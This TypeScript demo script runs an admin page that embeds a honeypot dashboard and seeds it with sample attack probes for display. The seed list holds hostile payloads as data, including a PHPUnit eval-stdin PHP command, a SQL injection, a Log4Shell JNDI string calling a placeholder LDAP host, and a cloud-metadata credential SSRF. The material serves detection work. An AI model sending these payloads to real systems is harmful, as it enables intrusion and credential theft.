#!/usr/bin/env tsx
/**
 * The dashboard as `<hackerpot-dashboard>`, inside somebody else's page.
 *
 *   npm run demo:embedded
 *
 *   :9675  an "admin panel" of our own, with the dashboard embedded in it
 *
 * `npm run demo` serves the dashboard as a page of its own. This is the other half: the same
 * dashboard as a custom element dropped into an admin panel you already have, inside your
 * own chrome, navigation and authentication rather than beside them on another port.
 *
 * Two things this demo is built around, because both are easy to get wrong:
 *
 * **It must be same-origin.** The dashboard sends no CORS headers, on purpose, and the
 * element refuses a `src` on another origin. So the handler is *mounted into this server*
 * with `createDashboardHandler`, under `/_hackerpot`, and the element points at that path.
 *
 * **A shadow root is a styling boundary, not a security boundary.** Any script running on
 * this page can reach into the dashboard and call its API with the viewer's credentials. A
 * page hosting it belongs behind the same authentication as the dashboard, which is why this
 * one asks for a password before serving anything at all.
 */
import { createServer } from "node:http";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { build } from "esbuild";
import { HoneypotEngine, createDashboardHandler, honeytokenDetector } from "../src/index.js";
import type { RequestFacts } from "../src/index.js";

const PORT = Number(process.env.ADMIN_PORT ?? 9675);
const USER = "demo";
const PASSWORD = process.env.ADMIN_PASSWORD ?? "hackerpot";
const root = join(dirname(fileURLToPath(import.meta.url)), "..");

/**
 * An engine with something to show. The element is the subject here, not detection, so
 * rather than wait for a simulator the demo evaluates a spread of real probes through a real
 * engine, from a few dozen addresses, before the page is opened.
 */
const engine = new HoneypotEngine({ enricher: null, extraDetectors: [honeytokenDetector({ tokens: ["AKIA_HACKERPOT_HONEYTOKEN_DEMO"] })] });

const PROBES: Array<Partial<RequestFacts>> = [
  { path: "/.env", headers: { host: "shop.example", "user-agent": "python-requests/2.31.0" } },
  { path: "/.git/config", headers: { host: "shop.example", "user-agent": "Mozilla/5.0 zgrab/0.x" } },
  { path: "/wp-login.php", headers: { host: "shop.example", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) wpscan" } },
  { path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", method: "POST", headers: { host: "shop.example", "user-agent": "curl/7.88.1" }, body: "<?php system('id'); ?>" },
  { path: "/search", query: { q: "' UNION SELECT username,password FROM users--" }, headers: { host: "shop.example", "user-agent": "sqlmap/1.7.2#stable (https://sqlmap.org)" } },
  { path: "/", headers: { host: "shop.example", "user-agent": "${jndi:ldap://198.51.100.7:1389/a}" } },
  { path: "/fetch", query: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }, headers: { host: "shop.example", "user-agent": "Go-http-client/1.1" } },
  { path: "/api/account", headers: { host: "shop.example", "user-agent": "curl/8.4.0", authorization: "Bearer AKIA_HACKERPOT_HONEYTOKEN_DEMO" } },
  { path: "/actuator/heapdump", headers: { host: "shop.example", "user-agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)" } },
  { path: "/cgi-bin/luci", headers: { host: "shop.example", "user-agent": "Mozila/5.0" } },
];

async function seed(): Promise<number> {
  let count = 0;
  // Spread over the last few hours, so the charts and the statistics window have a shape.
  const now = Date.now();
  for (let round = 0; round < 12; round++) {
    for (const [index, probe] of PROBES.entries()) {
      const at = now - (12 - round) * 20 * 60_000 + index * 7_000;
      await engine.evaluate(
        { method: "GET", path: "/", query: {}, headers: {}, ip: `203.0.113.${(round * PROBES.length + index) % 200}`, ...probe },
        { now: new Date(at) },
      );
      count++;
    }
  }
  return count;
}

/** The element, bundled on demand so `npm run demo:embedded` needs no build step first. */
async function elementBundle(): Promise<string> {
  const result = await build({ entryPoints: [join(root, "src", "element", "index.ts")], bundle: true, format: "esm", target: ["es2020"], write: false, logLevel: "silent" });
  return result.outputFiles[0]?.text ?? "";
}

const PAGE = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Acme — admin</title>
  <link rel="stylesheet" href="/admin.css">
</head>
<body>
  <header>
    <strong>Acme</strong><span class="sub">Admin</span>
    <nav><a href="#">Orders</a><a href="#">Customers</a><a href="#" aria-current="page">Security</a><a href="#">Settings</a></nav>
  </header>
  <main>
    <h1>Security</h1>
    <p class="lede">The HackerPot dashboard, embedded in this page as <code>&lt;hackerpot-dashboard&gt;</code> rather than served beside it.
    It is mounted at <code>/_hackerpot</code> on this same origin, because the dashboard sends no CORS headers and the element refuses a cross-origin <code>src</code>.</p>
    <div class="frame"><hackerpot-dashboard id="security" src="/_hackerpot"></hackerpot-dashboard></div>
  </main>
  <footer>A shadow root is a styling boundary, not a security boundary: a page hosting this belongs behind the same authentication as the dashboard itself.</footer>
  <script type="module" src="/admin.js"></script>
</body>
</html>`;

const CSS = `:root { color-scheme: light dark; --line: color-mix(in srgb, currentColor 15%, transparent); }
* { box-sizing: border-box; }
body { margin: 0; font: 15px/1.5 ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
header { display: flex; align-items: center; gap: 16px; padding: 12px 20px; border-bottom: 1px solid var(--line); }
header .sub { opacity: .55; font-size: 14px; }
nav { display: flex; gap: 4px; margin-left: auto; }
nav a { padding: 6px 10px; border-radius: 6px; text-decoration: none; color: inherit; opacity: .65; font-size: 14px; }
nav a[aria-current] { background: color-mix(in srgb, currentColor 10%, transparent); opacity: 1; }
main { padding: 20px; max-width: 1400px; margin-inline: auto; }
h1 { font-size: 20px; margin: 0 0 4px; }
.lede { margin: 0 0 20px; opacity: .7; font-size: 14px; max-width: 70ch; }
.frame { border: 1px solid var(--line); border-radius: 10px; overflow: hidden; }
footer { padding: 16px 20px; border-top: 1px solid var(--line); opacity: .6; font-size: 13px; }
code { background: color-mix(in srgb, currentColor 10%, transparent); padding: .1em .35em; border-radius: 4px; }`;

// Configuration is set before the element is defined, which is the order the element is
// built to survive: the accessor reclaims a value written before the upgrade.
const ADMIN_JS = `import { defineHackerpotDashboard } from "/element.js";
const node = document.getElementById("security");
node.config = {
  theme: { density: "compact" },
  tabs: [{ id: "overview" }, { id: "incidents", label: "Hits" }, { id: "statistics" }, { id: "sessions" }, { id: "actors" }],
  panels: [{ id: "acme-waf", screen: "overview", title: "Edge firewall", source: () => ({ rows: [{ label: "Rules loaded", value: 412 }, { label: "Blocked today", value: 1873, note: "at the CDN, before the honeypot" }] }) }],
};
defineHackerpotDashboard();
`;

const mounted = createDashboardHandler(engine, {
  basePath: "/_hackerpot",
  title: "Acme security",
  instance: "demo:embedded",
  // Mounted, there is no bind address to judge, so auth is required. Basic auth because the
  // element fetches with credentials "same-origin": the browser asks once, then attaches it.
  auth: { username: USER, password: PASSWORD },
});

const expected = `Basic ${Buffer.from(`${USER}:${PASSWORD}`).toString("base64")}`;
const [count, bundle] = await Promise.all([seed(), elementBundle()]);

const server = createServer((request, response) => {
  const url = new URL(request.url ?? "/", "http://admin.invalid");
  if (url.pathname === "/_hackerpot" || url.pathname.startsWith("/_hackerpot/")) return mounted(request, response);
  // The host page sits behind the same credential as the dashboard it embeds.
  if (request.headers.authorization !== expected) {
    response.writeHead(401, { "www-authenticate": 'Basic realm="Acme admin"', "content-type": "text/plain" });
    response.end("401\n");
    return;
  }
  const send = (type: string, body: string): void => {
    response.writeHead(200, { "content-type": type, "cache-control": "no-store", "content-security-policy": "default-src 'self'; style-src 'self'; script-src 'self'; frame-ancestors 'none'" });
    response.end(body);
  };
  if (url.pathname === "/") return send("text/html; charset=utf-8", PAGE);
  if (url.pathname === "/admin.css") return send("text/css; charset=utf-8", CSS);
  if (url.pathname === "/admin.js") return send("text/javascript; charset=utf-8", ADMIN_JS);
  if (url.pathname === "/element.js") return send("text/javascript; charset=utf-8", bundle);
  response.writeHead(404, { "content-type": "text/plain" });
  response.end("404\n");
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`admin panel with an embedded dashboard   http://127.0.0.1:${PORT}/`);
  console.log(`sign in as ${USER} / ${PASSWORD}`);
  console.log(`${count} probes evaluated, so there is something to look at.`);
});
